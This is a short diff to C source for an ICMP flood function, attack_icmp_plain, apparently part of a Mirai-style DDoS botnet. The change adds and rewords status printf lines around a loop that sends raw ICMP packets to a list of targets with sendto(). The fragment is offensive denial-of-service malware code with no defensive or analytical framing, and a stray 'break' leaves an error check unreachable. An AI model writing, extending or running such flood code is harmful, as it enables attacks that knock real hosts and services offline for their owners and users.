@@ -15,7 +15,7 @@
 
 void attack_icmp_plain(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
-    printf("Using ICMP Attack ...\n");
+    printf("[ATTACK] Initiating ICMP attack ...\n");
 
     int i, fd;
     char **pkts = calloc(targs_len, sizeof (char *));
@@ -77,8 +77,10 @@ void attack_icmp_plain(uint8_t targs_len, struct attack_target *targs, uint8_t o
         {
             char *pkt = pkts[i];
 
+            printf("[ICMP] Sending message ...\n");
             sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct icmphdr) + 32, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
         }
+        printf("[ICMP] Attack Finished\n");
             break;
             if (errno != 0)
                 printf("errno = %d\n", errno);
